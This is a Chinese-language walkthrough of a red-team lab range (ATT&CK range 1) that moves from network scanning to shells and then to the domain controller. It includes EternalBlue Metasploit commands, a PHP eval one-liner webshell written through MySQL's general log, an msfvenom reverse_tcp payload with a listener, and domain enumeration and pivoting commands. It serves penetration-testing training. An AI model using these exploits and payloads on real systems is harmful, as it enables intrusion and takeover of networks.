# 靶场练习——红队实战靶场ATT&CK（一）

# 靶机环境设置

1. 一共有三台机器，其中win7是外网web主机，winserver08是域控主机，Win2k3是域成员

   ![1.png](img/ATT&CK1/png1.png)

2. 为了能让攻击机器能够与win7靶机通信，需要让它们处于同一个网络环境中，设置win7虚拟机，添加一块网卡，根据自己的虚拟机网卡进行设置，我的虚拟机NAT网卡是VMnet8，这里就给win7靶机添加VMnet8的NAT网卡

   ![2.png](img/ATT&CK1/png2.png)

3. 打开win7虚拟机，开机密码是hongrisec@2019，根据自己的虚拟机网络情况设置网卡ip和网关，让win7靶机和攻击机器处于同一个网段下

   ![3.png](img/ATT&CK1/png3.png)

   ![4.png](img/ATT&CK1/png4.png)

   ![5.png](img/ATT&CK1/png5.png)

4. 设置win7靶机防火墙，只开启域防火墙

   ![6.png](img/ATT&CK1/png6.png)

# 外网突破

## 信息收集

1. 主机发现

   ```shell
    nmap -sn 192.168.2.0/24
   ```

   ![7.png](img/ATT&CK1/png7.png)

2. 192.168.2.128是我的虚拟机软路由ip，192.168.2.133是攻击机器ip，那么192.168.2.135就是win7靶机的ip了，扫一下端口

   ```shell
   nmap -Pn -sV -sC -p 1-65535 192.168.2.135
   ```

   ![8.png](img/ATT&CK1/png8.png)

3. 开放了80端口，发现有445端口和3306端口，疑似有ms17-010永恒之蓝漏洞，待会用fscan扫一下，先访问一下80端口，发现是一个php探针的页面

   ![9.png](img/ATT&CK1/png9.png)

4. 底部有一个mysql检测，试一下弱口令root/root，连接成功

   ![10.png](img/ATT&CK1/png10.png)

   ![11.png](img/ATT&CK1/png11.png)

5. dirsearch扫一下目录，发现有phpmyadmin

   ``` shell
   python3 dirsearch.py -u http://192.168.2.135 -e *
   ```

   ![12.png](img/ATT&CK1/png12.png)

6. 御剑扫一下，发现有一个beifen.rar文件

   ![12_1.png](img/ATT&CK1/png12_1.png)

## getshell

### 方法一：ms17-010直接拿system权限

1. fscan扫一下主机漏洞

   ``` shell
   fscan.exe -h 192.168.2.135
   ```

   ![13.png](img/ATT&CK1/png13.png)

2. 发现ms17-010，使用msf扫一下

   ``` shell
   search ms17_010
   use 3
   set rhost 192.168.2.135
   exploit
   ```

   ![14.png](img/ATT&CK1/png14.png)

   ![15.png](img/ATT&CK1/png15.png)

3. 扫描确认漏洞存在，使用exp进行利用（记得先把攻击机器上的杀软关掉，否则攻击会被拦截）

   ``` shell
   use windows/smb/ms17_010_eternalblue
   set 192.168.2.135
   expoit
   ```

   ![16.png](img/ATT&CK1/png16.png)

4. 利用成功，直接拿下system权限

5. msf拿下shell后出现乱码，输入如下命令即可解决

   ``` powershell
   chcp 65001
   ```

### 方法二：利用phpmyadmin数据库弱口令getshell

1. 通过弱口令root/root登录phpmyadmin，在左侧的数据库名中发现一个叫做newyxcms的数据库

   ![2.png](img/ATT&CK1/2/2.png)

2. 访问一下发现是一个建站系统cms，后面再看cms有没有漏洞，这里先进行phpMyAdmin的getshell，查询secure_file_priv（secure-file-priv是全局变量，指定文件夹作为导出文件存放的地方，这个值是只读的）是否为null

   ``` sql
   show variables like '%secure%'
   ```

   ![4.png](img/ATT&CK1/2/4.png)

3. 查询日志保存状态(ON代表开启 OFF代表关闭)和日志的保存路径

   ``` sql
   show variables like '%general%'
   ```

   ![5.png](img/ATT&CK1/2/5.png)

4. 若general_log为OFF，则修改这个值，开启日志保存

   ``` sql
   set global general_log='on';
   ```

5. 修改日志保存的路径(general_log_file值)

   ``` sql
   SET global general_log_file='C:/phpStudy/WWW/2.php'
   ```


6. 查询是否成功更改

   ``` sql
   show variables like '%general%'
   ```

   ![6.png](img/ATT&CK1/2/6.png)

7. 执行SQL语句写入一句话木马

   ``` sql
   SELECT '<?php @eval($_POST[1]);?>';
   ```

   ![7.png](img/ATT&CK1/2/7.png)

8. 使用蚁剑连接webshell，拿下权限

   ![8.png](img/ATT&CK1/2/8.png)

### 方法三：yxcms建站系统getshell

1. 先扫描一下yxcms的目录

   ![3_1.png](img/ATT&CK1/3/1.png)

   ![3_2.png](img/ATT&CK1/3/2.png)

2. 访问/yxcms/public/，发现有目录遍历

   ![3_2.png](img/ATT&CK1/3/3.png)

3. 发现一个csv表格文件，不知道有什么用

   ![3_3.png](img/ATT&CK1/3/4.png)

   ![3_5.png](img/ATT&CK1/3/5.png)

4. 查看robots.txt文件，发现有一个/protected目录

   ![3_6.png](img/ATT&CK1/3/6.png)

5. 查看/yxcms/protected目录，又是一个目录遍历

   ![3_7.png](img/ATT&CK1/3/7.png)

6. 通过目录遍历找到cms配置文件[cdb.sql](http://192.168.2.135/yxcms/protected/apps/install/cdb.sql)

   ![3_8.png](img/ATT&CK1/3/8.png)

7. 密文没解出来，在cms首页的公告信息里面发现了默认口令admin/123456，登录地址/index.php?r=admin

   ![3_9.png](img/ATT&CK1/3/9.png)

8. 使用默认口令登入后台

   ![3_10.png](img/ATT&CK1/3/10.png)

9. yxcms后台有几种getshell的方法，这里只演示通过模板管理写入webshell的方法，点击前台模板—>模板管理—>新增文件，然后写入webshell

   ![3_11.png](img/ATT&CK1/3/11.png)

10. 经过一番查找，找到了webshell文件的地址

    ![3_12.png](img/ATT&CK1/3/12.png)

11. 蚁剑连接shell.php，成功拿下web权限！

    ![3_13.png](img/ATT&CK1/3/13.png)

# 权限提升

1. 使用msf生成后门程序并上传至目标主机

   ``` powershell
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=4444 -f exe > shell.exe
   ```

   ![tq1.png](img/ATT&CK1/tq/1.png)

2. msf开启监听，webshell中运行后门程序，成功获取反弹shell

   ``` powershell
   use multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost 192.168.2.133  #攻击机器的ip，要接受反弹shell的ip地址
   set lport 4444
   run
   ```

   ![tq2.png](img/ATT&CK1/tq/2.png)

   ![tq2.png](img/ATT&CK1/tq/3.png)

3. 反弹shell成功后使用msf内置命令进行提权，直接获取system权限

   ``` powershell
   getsystem
   ```

   ![tq4.png](img/ATT&CK1/tq/4.png)

# 内网渗透

## 内网打点

1. 查看内网网络信息，发现存在两个不同ip段的网关，存在内网

   ``` powershell
   ipconfig/all
   ```

   ![17.png](img/ATT&CK1/png17.png)

   ![18.png](img/ATT&CK1/png18.png)

2. 查看一下系统补丁信息

   ``` powershell
   systeminfo
   ```

   ![19.png](img/ATT&CK1/png19.png)

3. 查看当前登录的域和用户

   ``` powershell
   net config workstation
   ```

   ![20.png](img/ATT&CK1/png20.png)

4. 判断主域

   ``` powershell
   net time /domain
   ```

   ![21.png](img/ATT&CK1/png21.png)

5. 查看域内主机

   ``` powershell
   net view
   ```

   ![23.png](img/ATT&CK1/png23.png)

6. 查看当前域内所有用户

   ``` powershell
   net user /domain
   ```

   ![24.png](img/ATT&CK1/png24.png)

7. 查看域控

   ``` powershell
   net group "domain controllers" /domain
   ```

   ![25.png](img/ATT&CK1/png25.png)

8. 通过ping命令获取域控IP

   ``` powershell
   ping OWA.god.org
   ```

   ![26.png](img/ATT&CK1/png26.png)

## 横向移动

1. 由于域控主机在另一个网段，攻击机器无法直接与域网段通信，需要在msf中添加一条路由进行转发，执行以下命令

   ``` powershell
   run autoroute -s 192.168.52.0/24
   ```
   
   ![27.png](img/ATT&CK1/png27.png)

2. 利用添加的路由进行内网主机和端口扫描，扫描一下域控主机192.168.52.138的139、445、3389端口，发现开放了139、445端口

   ``` powershell
   background
   use auxiliary/scanner/portscan/tcp
   set rhosts 192.168.52.138
   set ports 139,445,3389
   run
   ```

   ![28.png](img/ATT&CK1/png28.png)

3. 扫描一下ms17-010，存在ms17-010漏洞

   ``` powershell
   search ms17_010
   use 3
   set rhost 192.168.52.138
   exploit
   ```

   ![29.png](img/ATT&CK1/png29.png)

4. 利用ms17-010进行攻击，域控主机的确存在ms17-010漏洞，但是利用后直接蓝屏了，很是尴尬

   ``` powershell
   use exploit/windows/smb/ms17_010_eternalblue
   set rhost 192.168.52.138
   exploit
   ```

   ![30.png](img/ATT&CK1/png30.png)
